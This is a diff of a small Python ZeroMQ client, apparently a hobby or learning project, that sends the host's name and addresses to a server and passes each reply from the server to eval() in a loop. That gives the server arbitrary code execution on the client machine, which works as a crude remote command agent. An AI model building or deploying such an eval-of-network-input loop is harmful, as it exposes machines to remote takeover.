@@ -4,6 +4,7 @@ import zmq
 import os
 import sys
 import socket
+import os
 
 s = socket
 context = zmq.Context()
@@ -13,47 +14,36 @@ socket.connect(servSock)
 
 nombrePC = s.gethostbyname_ex(s.gethostname())
 comando = []
-envioInicial = [nombrePC]
+envioInicial = nombrePC
 devuelve = []
 
 while True:
     
-    try:        
-        if isinstance(comando, list):
-            devuelve.extend(envioInicial)
-            devuelve.extend(comando)
-            #Se transforma en string
-            #darFormatoDevuelve = ','.join(str(x) for x in devuelve)
-            darFormatoDevuelve = str(devuelve)
-        
-        elif isinstance(comando, str):
-            devuelve = comando
-            darFormatoDevuelve = devuelve
-        
-        elif isinstance(comando, float):
-            devuelve = str(comando)
-            darFormatoDevuelve = devuelve
-
-    except Exception as e:
-        darFormatoDevuelve = e
+    devuelve.extend(envioInicial)
+    devuelve.extend(comando)
+    #Se transforma en string
+    #darFormatoDevuelve = ','.join(str(x) for x in devuelve)
+    darFormatoDevuelve = str(devuelve)
 
     print('Enviando al servidor:{0}'.format(darFormatoDevuelve))
     socket.send(darFormatoDevuelve)
+    
     recibido = socket.recv()
     print('Recibiendo desde el servidor:{0}'.format(recibido))
     
     if recibido:
         try:
-            print('Ejecutando el EVAL')
-            comando = eval(recibido)  # eval(recibido)
+            #print('Ejecutando el EVAL')
+            comando = eval(recibido)
             print('comando contiene:'.format(str(comando)))
             devuelve = []
             darFormatoDevuelve = ''
         except Exception as e:
-            print(e)
+            print('Hubo una excepcion:',e)
+            comando = ''
             comando = e
             devuelve = []
-            darFormatoDevuelve = e
+            darFormatoDevuelve = ''
     else:
         comando = ''
         devuelve = []
